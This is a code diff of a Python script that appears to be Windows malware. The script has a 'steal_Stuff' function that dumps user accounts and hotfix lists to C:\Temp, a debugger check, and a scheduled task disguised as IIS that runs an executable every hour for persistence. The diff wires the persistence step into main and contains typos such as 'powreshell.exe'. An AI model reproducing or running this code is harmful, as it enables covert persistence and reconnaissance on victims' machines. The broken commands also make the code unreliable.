@@ -6,6 +6,7 @@ import ctypes
 import win32com
 import threading
 import datetime
+import time
 
 #Declare some Variables
 kernel32 = ctypes.WinDLL("kernel32", use_last_error=True)
@@ -29,7 +30,7 @@ def computer_Scheduler():
 
     time.sleep(5)
 
-    subprocess.Popen(r"schtasks /Create /SC HOURLY /MO 1 /TN IIS /TR C:\Windows\System32\iis.exe")
+    subprocess.Popen(r"schtasks /Create /SC HOURLY /MO 1 /TN IIS /TR C:\\Windows\\System32\\iis.exe")
 
     time.sleep(5)
 
@@ -87,8 +88,7 @@ def steal_Stuff():
 
     try:
         subprocess.Popen(r'net user >> C:\\Temp\\netuser.txt')
-        subprocess.Popen(r'net domain >> C:\\Temp\\netdomain.txt')
-        subprocess.Popen(r'powreshell.exe >> C:\\Temp\\powershell.txt')
+        subprocess.Popen(r'powreshell.exe Get-Hotfix >> C:\\Temp\\powershell.txt')
 
     except Exception as e:
         pass
@@ -141,12 +141,12 @@ def main():
     try:
         check_Debugger()
         steal_Stuff()
+        computer_Scheduler()
+
     except Exception as e:
         raise
 
 if __name__ == '__main__':
-    import itertools, glob
-
     try:
         main()
     except KeyboardInterrupt:
